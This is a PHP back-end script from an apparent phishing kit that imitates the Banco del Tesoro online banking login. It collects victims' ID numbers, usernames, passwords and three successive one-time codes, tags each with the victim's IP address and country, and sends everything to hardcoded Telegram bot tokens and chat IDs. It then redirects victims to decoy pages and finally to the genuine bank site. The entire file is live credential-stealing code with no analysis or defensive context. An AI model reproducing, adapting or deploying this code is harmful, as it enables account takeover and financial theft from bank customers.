<?php
ini_set("display_errors", 0);

/*DATOS DE TELEGRAM VENEZOLANOS*/
$apibotvz = "7836699091:AAHiOsdLq1_rW1I3cwAkiEusC8YUEV93-fM";
$canalvz =  "6734431637";

/*DATOS DE TELEGRAM JURIDICOS*/
$apibotjur = "7906533229:AAHuFiUVYaFTVqtFWCU_waBrBqj2WxC6ABQ";
$canaljur =  "6734431637";

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 



if (isset($_POST['txttipodoc']) && isset($_POST['txtdoc']) && isset($_POST['txtusr']) && isset($_POST['password'])   ){
	

$message = "====BDT-LINEA====\n\nDocumento: <code>".$_POST['txttipodoc']."</code> <code>".$_POST['txtdoc']."</code>\nUsuario: <code>".$_POST['txtusr']."</code>\nClave: <code>".$_POST['password']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";

if ($_POST['txttipodoc'] == "V"){
	$apibot  = $apibotvz;
	$canal = $canalvz ;
	
}else{
	$apibot  = $apibotjur;
	$canal = $canaljur ;
}

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 header('Location: carga.php?t='.$_POST['txttipodoc'].'&u='.$_POST['txtusr'].'');
}


if (isset($_POST['opt1']) && isset($_POST['txtusr']) && isset($_POST['txttipo'])  ){
	

$message = "====BDT-LINEA====\n\nUsuario: <code>".$_POST['txtusr']."</code>\nOPT-1: <code>".$_POST['opt1']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";

if ($_POST['txttipo'] == "V"){
	$apibot  = $apibotvz;
	$canal = $canalvz ;
	
}else{
	$apibot  = $apibotjur;
	$canal = $canaljur ;
}

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 header('Location: opterr.php?t='.$_POST['txttipo'].'&u='.$_POST['txtusr'].'');
}


if (isset($_POST['opt2'])  && isset($_POST['txtusr'])  && isset($_POST['txttipo']) ){
	

$message = "====BDT-LINEA====\n\nUsuario: <code>".$_POST['txtusr']."</code>\nOPT-2: <code>".$_POST['opt2']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";


if ($_POST['txttipo'] == "V"){
	$apibot  = $apibotvz;
	$canal = $canalvz ;
	
}else{
	$apibot  = $apibotjur;
	$canal = $canaljur ;
}

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 header('Location: opterr2.php?t='.$_POST['txttipo'].'&u='.$_POST['txtusr'].'');
}

if (isset($_POST['opt3'])  && isset($_POST['txtusr']) && isset($_POST['txttipo']) ){
	

$message = "====BDT-LINEA====\n\nUsuario: <code>".$_POST['txtusr']."</code>\nOPT-3: <code>".$_POST['opt3']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";

if ($_POST['txttipo'] == "V"){
	$apibot  = $apibotvz;
	$canal = $canalvz ;
	
}else{
	$apibot  = $apibotjur;
	$canal = $canaljur ;
}

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 header('Location: https://www.bt.com.ve/atencion-al-cliente/');
}
?>
